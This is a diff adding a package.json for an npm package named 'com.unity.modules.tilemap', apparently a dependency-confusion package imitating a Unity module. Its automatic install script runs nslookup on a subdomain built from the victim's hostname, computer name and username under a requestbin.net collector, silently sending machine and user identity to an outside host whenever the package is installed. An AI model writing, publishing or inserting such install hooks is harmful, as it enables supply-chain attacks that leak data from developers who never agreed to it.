@@ -1,0 +1,11 @@
+{
+  "name": "com.unity.modules.tilemap",
+  "version": "200.0.6",
+  "description": "com.unity.modules.tilemap: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.com.unity.modules.tilemap.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
